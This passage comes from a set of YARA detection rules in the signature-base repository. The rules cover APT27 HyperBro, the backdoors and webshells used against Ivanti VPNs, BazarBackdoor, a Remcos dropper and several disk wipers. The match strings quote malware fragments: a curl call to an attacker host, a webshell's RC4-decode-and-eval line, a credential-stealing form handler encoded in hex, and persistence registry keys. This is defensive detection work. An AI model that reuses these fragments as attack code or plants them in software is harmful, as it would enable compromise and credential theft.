		filesize < 500KB and $csharpshell and ( 1 of ( $x* ) or all of ( $s* ) )
}

rule SIGNATURE_BASE_APT_RU_APT27_Hyperbro_Vftrace_Loader_Jan22_1 : FILE
{
	meta:
		description = "Yara rule to detect first Hyperbro Loader Stage, often called vftrace.dll. Detects decoding function."
		author = "Bundesamt fuer Verfassungsschutz (modified by Florian Roth)"
		id = "b049e163-2694-5fb9-a3a3-98cc77bcd0ca"
		date = "2022-01-14"
		modified = "2023-12-05"
		reference = "https://www.verfassungsschutz.de/SharedDocs/publikationen/DE/cyberabwehr/2022-01-bfv-cyber-brief.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_apt27_hyperbro.yar#L3-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "333b52c2cfac56b86ee9d54aef4f0ff4144528917bc1aa1fe1613efc2318339a"
		logic_hash = "d8785ea937891636bea5ed8128de44fa6084a1a48800c1586739c5ca9e4c43bd"
		score = 75
		quality = 85
		tags = "FILE"
		sharing = "TLP:WHITE"

	strings:
		$decoder_routine = { 8A ?? 41 10 00 00 8B ?? 28 ?? ?? 4? 3B ?? 72 ?? }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 5MB and $decoder_routine and pe.exports ( "D_C_Support_SetD_File" )
}

rule SIGNATURE_BASE_APT_CN_APT27_Compromised_Certficate_Jan22_1
{
	meta:
		description = "Detects compromised certifcates used by APT27 malware"
		author = "Florian Roth (Nextron Systems)"
		id = "f2f015af-219d-51ab-9529-01687a879ebb"
		date = "2022-01-29"
		modified = "2023-12-05"
		reference = "https://www.verfassungsschutz.de/SharedDocs/publikationen/DE/cyberabwehr/2022-01-bfv-cyber-brief.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_apt27_hyperbro.yar#L21-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "94a40d55936fc341eaba5e1accc8bfe3a401114298e7a3cc4d5c64af36eadf9e"
		score = 80
		quality = 85
		tags = ""

	condition:
		for any i in ( 0 .. pe.number_of_signatures ) : ( pe.signatures [ i ] . issuer contains "DigiCert SHA2 Assured ID Code Signing CA" and pe.signatures [ i ] . serial == "08:68:70:51:50:f1:cf:c1:fc:c3:fc:91:a4:49:49:a6" )
}
rule SIGNATURE_BASE_Hvs_APT27_Hyperbro_Decrypted_Stage2 : FILE
{
	meta:
		description = "HyperBro Stage 2 and compressed Stage 3 detection"
		author = "Moritz Oettle"
		id = "039e5d41-eadb-5c53-82cd-20ffd4105326"
		date = "2022-02-07"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_apt27_hyperbro.yar#L35-L57"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "fc5a58bf0fce9cb96f35ee76842ff17816fe302e3164bc7c6a5ef46f6eff67ed"
		logic_hash = "6eb56c4a92e89977e536ccc3c70170062aca072c6981b40aeea184ea2ca461a6"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$lznt1_compressed_pe_header_small = { FC B9 00 4D 5A 90 }
		$lznt1_compressed_pe_header_large_1 = { FC B9 00 4D 5A 90 00 03 00 00 00 82 04 00 30 FF FF 00 }
		$lznt1_compressed_pe_header_large_2 = { 00 b8 00 38 0d 01 00 40 04 38 19 00 10 01 00 00 }
		$lznt1_compressed_pe_header_large_3 = { 00 0e 1f ba 0e 00 b4 09 cd 00 21 b8 01 4c cd 21 }
		$lznt1_compressed_pe_header_large_4 = { 54 68 00 69 73 20 70 72 6f 67 72 00 61 6d 20 63 }
		$lznt1_compressed_pe_header_large_5 = { 61 6e 6e 6f 00 74 20 62 65 20 72 75 6e 00 20 69 }
		$lznt1_compressed_pe_header_large_6 = { 6e 20 44 4f 53 20 00 6d 6f 64 65 2e 0d 0d 0a 02 }

	condition:
		filesize < 200KB and ( $lznt1_compressed_pe_header_small at 0x9ce ) or ( all of ( $lznt1_compressed_pe_header_large_* ) )
}
rule SIGNATURE_BASE_Hvs_APT27_Hyperbro_Stage3_Persistence
{
	meta:
		description = "HyperBro Stage 3 registry keys for persistence"
		author = "Marko Dorfhuber"
		id = "2bb1d28b-5fc4-5f0b-b546-c8b8192b0d48"
		date = "2022-02-07"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_apt27_hyperbro.yar#L103-L117"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "624e85bd669b97bc55ed5c5ea5f6082a1d4900d235a5d2e2a5683a04e36213e8"
		logic_hash = "db4b7be2bafe29b5e7c81a90e17a660cf73cff1c2e8edd04a9421daba09e3e0e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "SOFTWARE\\WOW6432Node\\Microsoft\\config_" ascii
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\windefenders" ascii

	condition:
		1 of them
}
rule SIGNATURE_BASE_MAL_ELF_Xlogin_Nov24_1 : FILE
{
	meta:
		description = "Detects xlogin backdoor samples"
		author = "Florian Roth"
		id = "e8940660-ecf8-5616-9cb1-fc0a02d35689"
		date = "2024-11-11"
		modified = "2024-12-12"
		reference = "https://blog.sekoia.io/solving-the-7777-botnet-enigma-a-cybersecurity-quest/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_xlogin_nov24.yar#L2-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "2b09a6811a9d0447f8c6480430eb0f7e3ff64fa933d0b2e8cd6117f38382cc6a"
		hash = "d1cbf80786b1ca1ba2e5c31ec09159be276ad3d10fc0a8a0dbff229d8263ca0a"
		hash = "ff17e9bcc1ed16985713405b95745e47674ec98e3c6c889df797600718a35b2c"
		logic_hash = "42fe8a32022592ff976d6d2839d949e28f60c8958f64a20c1c3c9091fb64d31e"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$xc1 = { 6C 6F 67 69 6E 3A 00 25 73 00 00 2F 62 69 6E 2F 73 68 00 2F 74 6D 70 2F 6C 6F 67 69 6E }
		$s1 = "/tmp/login" ascii fullword
		$s2 = "npxXoudifFeEgGaACSnmcs[" ascii fullword
		$sc1 = { 28 6E 69 6C 29 00 00 00 28 6E 75 6C 6C 29 }

	condition:
		uint16( 0 ) == 0x457f and filesize < 500KB and ( 1 of ( $x* ) or 2 of them )
}
rule SIGNATURE_BASE_MAL_Github_Repo_Compromise_Myjino_Ru_Aug22
{
	meta:
		description = "Detects URL mentioned in report on compromised Github repositories in August 2022"
		author = "Florian Roth (Nextron Systems)"
		id = "1eaabad5-d0de-5d17-a5fa-3c638354843d"
		date = "2022-08-03"
		modified = "2023-12-05"
		reference = "https://twitter.com/stephenlacy/status/1554697077430505473"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_repo_compromise_myjino_ru.yar#L2-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "5cbe6ee46a68d89b1e772762e29baa907458235cd014f20a0d0932e95c046f19"
		score = 90
		quality = 85
		tags = ""

	strings:
		$x1 = "curl http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide
		$x2 = "http__.Post(\"http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide

	condition:
		1 of them
}
rule SIGNATURE_BASE_HKTL_FRP_Apr20_1
{
	meta:
		description = "Detects FRP fast reverse proxy tool often used by threat groups"
		author = "Florian Roth (Nextron Systems)"
		id = "55483832-0e0b-5c28-8be5-dbd14ddb50e3"
		date = "2020-04-07"
		modified = "2022-11-03"
		reference = "https://github.com/fatedier/frp"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_frp_proxy.yar#L2-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "05537c1c4e29db76a24320fb7cb80b189860389cdb16a9dbeb0c8d30d9b37006"
		hash = "08c685c8febb5385f7548c2a64a27bae7123a937c5af958ebc08a3accb29978d"
		logic_hash = "21f91fd99aed8b62d804504889c41ca77567fd345cf4ea0ef00161eefa9324a7"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "frp/vendor/github.com/spf13/" ascii
		$x2 = "github.com/fatedier/frp/vendor/" ascii
		$fpg2 = "<html"
		$fpg3 = "<HTML"
		$fpg6 = "<?xml"

	condition:
		1 of ( $x* ) and not 1 of ( $fp* )
}
rule SIGNATURE_BASE_APT_UNC5221_Ivanti_Forensicartifacts_Jan24_1 : FILE
{
	meta:
		description = "Detects forensic artifacts found in the Ivanti VPN exploitation campaign by APT UNC5221"
		author = "Florian Roth"
		id = "49ba2a96-379d-5a58-979d-45e83fa546e7"
		date = "2024-01-11"
		modified = "2024-04-24"
		reference = "https://www.mandiant.com/resources/blog/suspected-apt-targets-ivanti-zero-day"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_report_ivanti_mandiant_jan24.yar#L2-L16"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "7f485f41072f5584dc76e71564e13066d9fe41685f33bff9c2886fa7d2155f94"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "system(\"chmod a+x /home/etc/sql/dsserver/sessionserver.sh\");"
		$x2 = "SSH-2.0-OpenSSH_0.3xx."
		$x3 = "sed -i '/retval=$(exec $installer $@)/d' /pkg/do-install"

	condition:
		filesize < 5MB and 1 of them
}
rule SIGNATURE_BASE_M_Hunting_Backdoor_ZIPLINE_1 : FILE
{
	meta:
		description = "This rule detects unique strings in ZIPLINE, a passive ELF backdoor that waits for incoming TCP connections to receive commands from the threat actor."
		author = "Mandiant"
		id = "753884d6-d4c1-5e94-9d2c-f6ebb7bfaf85"
		date = "2024-01-11"
		modified = "2024-04-24"
		reference = "https://www.mandiant.com/resources/blog/suspected-apt-targets-ivanti-zero-day"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_report_ivanti_mandiant_jan24.yar#L18-L38"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "41857ba465dd1f2e1aa8c1eed36b73606385eeedf233fd480bb8a4ef15499174"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "SSH-2.0-OpenSSH_0.3xx" ascii
		$s2 = "$(exec $installer $@)" ascii
		$t1 = "./installer/do-install" ascii
		$t2 = "./installer/bom_files/" ascii
		$t3 = "/tmp/data/root/etc/ld.so.preload" ascii
		$t4 = "/tmp/data/root/home/etc/manifest/exclusion_list" ascii

	condition:
		uint32( 0 ) == 0x464c457f and filesize < 5MB and ( ( 1 of ( $s* ) ) or ( 3 of ( $t* ) ) )
}
rule SIGNATURE_BASE_M_Hunting_Dropper_WIREFIRE_1 : FILE
{
	meta:
		description = "This rule detects WIREFIRE, a web shell written in Python that exists as trojanized logic to a component of the pulse secure appliance."
		author = "Mandiant"
		id = "051244f0-00b1-5a4b-8c81-f4ce6f1aa22a"
		date = "2024-01-11"
		modified = "2024-04-24"
		reference = "https://www.mandiant.com/resources/blog/suspected-apt-targets-ivanti-zero-day"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_report_ivanti_mandiant_jan24.yar#L40-L58"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "6de651357a15efd01db4e658249d4981"
		logic_hash = "c389a666bd093cdd7700385da43c8fa58b9f3d899e658c516df0f3aca439401d"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "zlib.decompress(aes.decrypt(base64.b64decode(" ascii
		$s2 = "aes.encrypt(t+('\\x00'*(16-len(t)%16))" ascii
		$s3 = "Handles DELETE request to delete an existing visits data." ascii
		$s4 = "request.data.decode().startswith('GIF'):" ascii
		$s5 = "Utils.api_log_admin" ascii

	condition:
		filesize < 10KB and all of them
}
rule SIGNATURE_BASE_M_Hunting_Webshell_LIGHTWIRE_2 : FILE
{
	meta:
		description = "Detects LIGHTWIRE based on the RC4 decoding and execution 1-liner."
		author = "Mandiant (modified by Florian Roth)"
		id = "9451da63-c68e-51e8-b4b1-c3082d46fbf6"
		date = "2024-01-11"
		modified = "2024-01-12"
		reference = "https://www.mandiant.com/resources/blog/suspected-apt-targets-ivanti-zero-day"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_report_ivanti_mandiant_jan24.yar#L60-L81"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3d97f55a03ceb4f71671aa2ecf5b24e9"
		logic_hash = "37b22a6c45dd53bc7b3f0c75cc5072e990246fea24591d192176c0b496e92084"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "eval{my"
		$s2 = "Crypt::RC4->new(\""
		$s3 = "->RC4(decode_base64(CGI::param('"
		$s4 = ";eval $"
		$s5 = "\"Compatibility check: $@\";}"

	condition:
		filesize < 10KB and all of them
}
rule SIGNATURE_BASE_M_Hunting_Dropper_THINSPOOL_1 : FILE
{
	meta:
		description = "This rule detects THINSPOOL, a dropper that installs the LIGHTWIRE web shell onto a Pulse Secure system."
		author = "Mandiant"
		id = "dd340f72-0a2c-5b66-9e31-1c0f20cd842f"
		date = "2024-01-11"
		modified = "2024-04-24"
		reference = "https://www.mandiant.com/resources/blog/suspected-apt-targets-ivanti-zero-day"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_report_ivanti_mandiant_jan24.yar#L83-L100"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "677c1aa6e2503b56fe13e1568a814754"
		logic_hash = "a8043822cd36a802ba6656c42085f09d67cedb0689c9da48438d788b320bd6c0"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "/tmp/qactg/" ascii
		$s2 = "echo '/home/config/dscommands'" ascii
		$s3 = "echo '/home/perl/DSLogConfig.pm'" ascii
		$s4 = "ADM20447" ascii

	condition:
		filesize < 10KB and all of them
}
rule SIGNATURE_BASE_M_Hunting_Credtheft_WARPWIRE_1 : FILE
{
	meta:
		description = "This rule detects WARPWIRE, a credential stealer written in JavaScript that is embedded into a legitimate Pulse Secure file."
		author = "Mandiant"
		id = "9a6a8783-b531-560d-998d-8aa7c90158a8"
		date = "2024-01-11"
		modified = "2024-04-24"
		reference = "https://www.mandiant.com/resources/blog/suspected-apt-targets-ivanti-zero-day"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_report_ivanti_mandiant_jan24.yar#L102-L120"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "d0c7a334a4d9dcd3c6335ae13bee59ea"
		logic_hash = "8029df5998166ab3db3319b0dd765ef3356b4b44dc16d2d418015a0f7ffac97e"
		score = 75
		quality = 77
		tags = "FILE"

	strings:
		$s1 = {76 61 72 20 77 64 61 74 61 20 3d 20 64 6f 63 75 6d 65 6e 74 2e 66 72 6d 4c 6f 67 69 6e 2e 75 73 65 72 6e 61 6d 65 2e 76 61 6c 75 65 3b}
		$s2 = {76 61 72 20 73 64 61 74 61 20 3d 20 64 6f 63 75 6d 65 6e 74 2e 66 72 6d 4c 6f 67 69 6e 2e 70 61 73 73 77 6f 72 64 2e 76 61 6c 75 65 3b}
		$s3 = {2b 77 64 61 74 61 2b 27 26 27 2b 73 64 61 74 61 3b}
		$s4 = {76 61 72 20 78 68 72 20 3d 20 6e 65 77 20 58 4d 4c 48 74 74 70 52 65 71 75 65 73 74}
		$s5 = "Remember the last selected auth realm for 30 days" ascii

	condition:
		filesize < 8KB and all of them
}
rule SIGNATURE_BASE_MAL_Etoroloro_Malicious_Nodepackage_Dec25 : FILE
{
	meta:
		description = "Detects malicious component of node package named Etoroloro"
		author = "Pezier Pierre-Henri"
		id = "4c271502-68c6-5d20-85ea-c7f7628e417a"
		date = "2025-12-12"
		modified = "2026-05-15"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_etoroloro_nodepackage_dec25.yar#L2-L27"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "f08c5b748c91dd45fd73c5e85920f656e361d94b869e2147410b2b528c6ae78f"
		logic_hash = "bd890359c38fb7f2af31390666691af70a202dcf352ef44e95493dc340c07e94"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "DLLSideload."
		$s2 = "Failed to expand path:" wide
		$op1 = {
         41 0f af c0           // imul    eax, r8d
         48 8d 52 01           // lea     rdx, [rdx+1]
         0f b6 c9              // movzx   ecx, cl
         45 69 c0 35 d4 04 00  // imul    r8d, 4D435h
         03 c1                 // add     eax, ecx
         0f b6 0a              // movzx   ecx, byte ptr [rdx]
         84 c9                 // test    cl, cl
         75 e5                 // jnz     short loc_1800022C0
      }

	condition:
		uint16( 0 ) == 0x5a4d and ( all of ( $s* ) or $op1 )
}
rule SIGNATURE_BASE_Crime_Win64_Backdoor_Bazarbackdoor1 : FILE
{
	meta:
		description = "Detects BazarBackdoor injected 64-bit malware"
		author = "@VK_Intel"
		id = "1e387791-97fa-527d-87ed-68872b1891c4"
		date = "2020-04-24"
		modified = "2023-12-05"
		reference = "https://twitter.com/pancak3lullz/status/1252303608747565057"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_bazarbackdoor.yar#L1-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "becb6ebc3a1be061b4f602cc188b172f59bfb6342605af68d8b38009d589f57e"
		score = 75
		quality = 85
		tags = "FILE"
		tlp = "white"

	strings:
		$str1 = "%id%"
		$start = { 48 ?? ?? ?? ?? 57 48 83 ec 30 b9 01 00 00 00 e8 ?? ?? ?? ?? 84 c0 0f ?? ?? ?? ?? ?? 40 32 ff 40 ?? ?? ?? ?? e8 ?? ?? ?? ?? 8a d8 8b ?? ?? ?? ?? ?? 83 f9 01 0f ?? ?? ?? ?? ?? 85 c9 75 ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 85 c0 74 ?? b8 ff 00 00 00 e9 ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? eb ?? 40 b7 01 40 ?? ?? ?? ?? 8a cb e8 ?? ?? ?? ?? e8 ?? ?? ?? ?? 48 8b d8 48 ?? ?? ?? 74 ??}
		$server = {40 53 48 83 ec 20 48 8b d9 e8 ?? ?? ?? ?? 85 c0 75 ?? 0f ?? ?? ?? ?? ?? ?? 66 83 f8 50 74 ?? b9 bb 01 00 00 66 3b c1 74 ?? a8 01 74 ?? 48 8b cb e8 ?? ?? ?? ?? 84 c0 75 ?? 48 8b cb e8 ?? ?? ?? ?? b8 f6 ff ff ff eb ?? 33 c0 48 83 c4 20 5b c3}

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule SIGNATURE_BASE_MAL_Coralwave_Lenovospkvol_Remcosmicdrop : FILE
{
	meta:
		description = "CoralWave loader masquerading as Lenovo audio DLL. Drops Remcos RAT."
		author = "xstp"
		id = "fddc398d-6283-5819-895a-d520aff7088c"
		date = "2026-01-01"
		modified = "2026-05-15"
		reference = "https://bazaar.abuse.ch/sample/050edadedd7947bc6418f7856a29df5b7b5550bf5eec7f5f37e9a7e1713036f6/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_coralwave_remcos_dropper.yar#L1-L30"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "65302b435a5bc30e8f0215455679635ec50b5b1caba9e55f9258d17c7238be54"
		logic_hash = "ec6303584d65cf2138ca44a1cf5e958586d9eee2e9e17a90d0942b1ebee3d01f"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$stub_1 = "BAyXuHpAGwdG8ebXF3GvZ32vO3ORY" ascii
		$stub_2 = "IK5HT1XPlj3LoFkKi3YC4QwYQs7s" ascii
		$stub_3 = "Xmk61GHDjDfjUjJhNjwDPXxM1Cdg" ascii
		$fake_1 = "GetVolumeLevel" ascii
		$fake_2 = "OpenSpeakerVolumeInterface" ascii
		$fake_3 = "SetMuteState" ascii
		$mutex = "Rmc-245S33" wide ascii
		$log_file = "logs.dat" wide ascii
		$audio_folder = "MicRecords" wide ascii

	condition:
		filesize < 5MB and uint16( 0 ) == 0x5A4D and ( 2 of ( $stub_* ) or ( 2 of ( $fake_* ) and 1 of ( $mutex , $log_file , $audio_folder ) ) )
}
rule SIGNATURE_BASE_SUSP_LNX_SH_Disk_Wiper_Script_Jun25 : FILE
{
	meta:
		description = "Detects unknown disk wiper script for Linux systems"
		author = "Florian Roth"
		id = "aad68277-4889-512d-b8b3-a4c4706fbc9e"
		date = "2025-06-19"
		modified = "2026-05-15"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_wipers_jun25.yar#L24-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "f662f69fc7f4240cd8c00661db9484e76b5d02f903590140b4086fefcf9d9331"
		logic_hash = "99a0a393c2a636c10195c7ad85f3b282a30ba05fbc0f0db7fc04b0f79fbc6760"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "THIS SCRIPT IS LIVE AND ARMED!" ascii fullword
		$s2 = "FAIR WARNING!" ascii fullword
		$s3 = "lists devices" ascii fullword

	condition:
		uint16( 0 ) == 0x2123 and filesize < 2KB and all of them
}
rule SIGNATURE_BASE_SUSP_PY_Pyinstaller_Swiper_Jun25 : FILE
{
	meta:
		description = "Detects suspicious Python based executable with similarities to a known disk wiper"
		author = "Florian Roth"
		id = "049587a8-275d-59a6-bfbd-b72173d21a73"
		date = "2025-06-19"
		modified = "2026-05-15"
		reference = "https://x.com/cyb3rops/status/1935707307805134975"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_wipers_jun25.yar#L43-L62"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "4f669ecbe12e95d51f37be76933de4c2626d20bb01729086ce2efc603c4ffdf3"
		logic_hash = "824bdda031336b2d9a60b09bfa36e68a2e03159b217c9c25dd708df454144e1e"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$a1 = "bzlib1.dll" ascii fullword
		$a2 = "VCRUNTIME140_1.dll" wide fullword
		$a3 = "%s%c%s.exe" ascii fullword
		$sc1 = { 73 77 69 70 65 72 00 00 00 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 40000KB and all of them
}
rule SIGNATURE_BASE_APT_MAL_IR_Druidfly_Wiper_Jun25 : FILE
{
	meta:
		description = "Detects Wiper used by the Iranian DruidFly group"
		author = "Florian Roth"
		id = "4d731d9a-6f35-51a3-84de-5aa33114b75c"
		date = "2025-06-21"
		modified = "2026-05-15"
		reference = "https://x.com/threatintel/status/1936049254432231444"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_wipers_jun25.yar#L64-L91"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "81eb22828306f3197b35fef2035cef2c548f587f8511902852964850023389d7"
		logic_hash = "9d3872506b03ea03a2c3cd7304c6b2d9dfafa04a29e19dc9be4924eaaa5db2d6"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$xc1 = { 2E 62 61 63 6B 75 70 00 2E 63 6F 6E 66 69 67 00   // .backup .config
               2E 64 62 00 00 00 00 00 2E 73 71 6C 69 74 65 00 }
		$xc2 = { 00 5C 5C 2E 5C 25 63 3A 00 25 63 3A 5C 00 00 00
               00 4E 54 46 53 00 00 00 00 5C }
		$x1 = "%s:%d:%s(): [+] Overwriting \"%s\" \"..." ascii
		$s1 = "C:\\Windows\\System32\\drivers\\beep.sys" ascii fullword
		$s2 = "\\DosDevices\\sectorio" wide fullword

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 2 of them ) or 3 of them
}
rule SIGNATURE_BASE_SUSP_LNX_Byteencoder_Jan25 : FILE
{
	meta:
		description = "Detects Linux binaries that encode bytes by splitting them into upper and lower nibbles and mapping them to custom lookup tables, seen being used by SEASPY and Bluez backdoors"
		author = "MalGamy (Nextron System)"
		id = "4866348a-2129-5f6a-9498-8ab1acfa74b4"
		date = "2025-01-23"
		modified = "2025-03-20"
		reference = "https://www.securityweek.com/newly-discovered-turla-malware-targets-linux-systems/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/seaspy_backdoor_jan25.yar#L1-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3e0312ce8d0c1e5c192dbb93cac4770a1205c56dc9d02a0510c7e10a15251de5"
		hash = "301d58a6a1819466e77209dbf8ca635cbee3b45516e5ee228fea50ae4a27b7d5"
		hash = "957c0c135b50d1c209840ec7ead60912a5ccefd2873bf5722cb85354cea4eb37"
		hash = "5e3c128749f7ae4616a4620e0b53c0e5381724a790bba8314acb502ce7334df2"
		hash = "b0b83e1c69aa8df6da4383230bef1ef46e09f3bf26cec877eac53a9d48dc53ca"
		hash = "d21b40645e33638bd36b63582c2c6ad5e8230c731236a54e8e5f4139bad31fdf"
		logic_hash = "c0fe841681d3aaa8687c95f475f68b2d8b2f26afe42e9d15c601602fcc5e50cb"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$op1 = {8B 45 FC 48 63 D0 48 8B 45 A8 48 01 C2 8B 45 BC C1 F8 04 83 E0 0F 48 98 0F B6 44 05 E0 88 02}
		$op2 = {8B 45 FC 48 98 48 8D 50 01 48 8B 45 A8 48 01 C2 8B 45 BC 83 E0 0F 48 98 0F B6 44 05 C0 88 02}

	condition:
		uint32be( 0 ) == 0x7f454c46 and filesize < 4MB and all of them
}
rule SIGNATURE_BASE_SUSP_LNX_Stackstring_Technique_Jan25 : FILE
{
	meta:
		description = "Detects suspicious Linux binaries using stack-based string manipulation techniques, which are often used to generate PTY (pseudo-terminal) device names for stealth or persistence, seen being used by SEASPY and Bluez backdoors"
		author = "MalGamy (Nextron System)"
		id = "6c81d8c1-0cfa-54d9-89d3-2b025cc22f13"
		date = "2025-01-23"
		modified = "2025-03-20"
		reference = "https://www.securityweek.com/newly-discovered-turla-malware-targets-linux-systems/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/seaspy_backdoor_jan25.yar#L24-L45"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "0e65a80c6331a0e8d7df05ac217a8a7fe03b88f1d304f2ff0a26b92ed89153f3"
		hash = "3e0312ce8d0c1e5c192dbb93cac4770a1205c56dc9d02a0510c7e10a15251de5"
		hash = "301d58a6a1819466e77209dbf8ca635cbee3b45516e5ee228fea50ae4a27b7d5"
		hash = "957c0c135b50d1c209840ec7ead60912a5ccefd2873bf5722cb85354cea4eb37"
		hash = "5e3c128749f7ae4616a4620e0b53c0e5381724a790bba8314acb502ce7334df2"
		hash = "654b7c5b667e4d70ebb5fb1807dcd1ee5b453f45424eb59a287d86ad8d0598a1"
		hash = "ac6a8ec0b92935b7faab05ca21a42ed9eecdc9243fcf1449cc8f050de38e4c4f"
		logic_hash = "6efc2d7bd6ba1f39554bd6c378e5adb209419c90192fcba0a676b557e5b920b5"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$op1 = {C7 45 E0 70 71 72 73 C7 45 E4 74 75 76 77 C7 45 E8 78 79 7A 61 C7 45 EC 62 63 64 65 C6 45 F0 00 C7 45 C0 30 31 32 33 C7 45 C4 34 35 36 37 C7 45 C8 38 39 61 62 C7 45 CC 63 64 65 66}

	condition:
